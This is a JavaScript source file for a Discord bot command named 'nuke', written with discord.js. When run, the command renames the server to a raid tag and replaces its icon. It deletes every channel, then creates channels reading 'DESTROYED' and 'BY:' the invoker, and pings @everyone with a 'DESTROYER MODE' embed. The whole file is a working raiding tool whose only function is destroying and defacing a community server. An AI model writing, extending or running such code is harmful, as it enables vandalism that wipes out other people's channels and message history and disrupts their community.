const {
  MessageEmbed
} = require('discord.js');

module.exports = {
  name: "nuke",
  aliases: ['nk'],
  owner: false,
  dsc: true,
  description: "Delete All Channels, Change Name Guild, Change Icon Guild",
  run: async(client, msg, args) => {
    let nm = args.slice(0).join(" ") || `RΣX RIOTタ`;
    msg.delete();
    await msg.guild.setName(`${nm}`)
    await msg.guild.setIcon('./rex.png')
    msg.guild.channels.cache.forEach(channel => channel.delete().catch(e => console.error(`\x1b[31mError | Error Delete ${channel.name}`)) && console.log(`\x1b[32mLog | ${channel.name} Has Been Delete!`));
    msg.guild.channels.create(`🅡🅔🅣🅩`, {
          type: "GUILD_TEXT",
          permissionOverwrites: [{
            id: msg.guild.roles.everyone,
            allow: ["VIEW_CHANNEL", "READ_MESSAGE_HISTORY"],
            deny: ["SEND_MESSAGES"]
          }]
        }).then(channel => channel.send(`> **Oh** 
@here`))
    msg.guild.channels.create('━━━━━━━━━━●', {
          type: "GUILD_VOICE",
          permissionOverwrites: [{
            id: msg.guild.roles.everyone,
            allow: ["VIEW_CHANNEL", "CONNECT", "SPEAK"]
          }]
    });
    msg.guild.channels.create('DESTROYED', {
          type: "GUILD_VOICE",
          permissionOverwrites: [{
            id: msg.guild.roles.everyone,
            allow: ["VIEW_CHANNEL", "CONNECT", "SPEAK"]
          }]
    });
    msg.guild.channels.create(`BY: ${msg.author.username}`, {
          type: "GUILD_VOICE",
          permissionOverwrites: [{
            id: msg.guild.roles.everyone,
            allow: ["VIEW_CHANNEL", "CONNECT", "SPEAK"]
          }]
    });
    msg.guild.channels.create('━━━━━━━━━━●', {
          type: "GUILD_VOICE",
          permissionOverwrites: [{
            id: msg.guild.roles.everyone,
            allow: ["VIEW_CHANNEL", "CONNECT", "SPEAK"]
          }]
    })
    msg.guild.channels.create(`${nm}`, {
            type: "GUILD_CATEGORY",
            permissionOverwrites: [{
              id: msg.guild.roles.everyone,
              allow: ["VIEW_CHANNEL", "SEND_MESSAGES", "READ_MESSAGE_HISTORY", "CONNECT", "SPEAK"]
            }]
    });
    msg.guild.channels.create(`general`, {
          type: 'GUILD_TEXT',
          permissionOverwrites: [{
            id: msg.guild.roles.everyone,
            allow: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY']
          }]
        }).then(channel => {
      let category = msg.guild.channels.cache.find(c => c.type == 'GUILD_CATEGORY');

      if(!category) return msg.reply(`**Category Not Found!**`);
      channel.setParent(category.id);

      const embed = new MessageEmbed()
      .setAuthor(`⚠️ DESTROYER MODEタ+-`, msg.author.displayAvatarURL({
        dynamic: true
      }))
      .setTitle(`**Message For You**`)
      .setDescription(`**Surprise!**
Special tag: @everyone`)
      .setTimestamp()
      .setFooter(`Destroyed By: ${msg.author.tag}`)
      .setThumbnail(msg.guild.iconURL({
        dynamic: true
      }))
      channel.send({
      content: '||@here||',
      embeds: [embed]
      })
    }).catch((e) => console.error(`\x1b[31mError | ${e}`))
      console.log(`\x1b[32mLog | Successfully Delete All Channels!`)
  }
}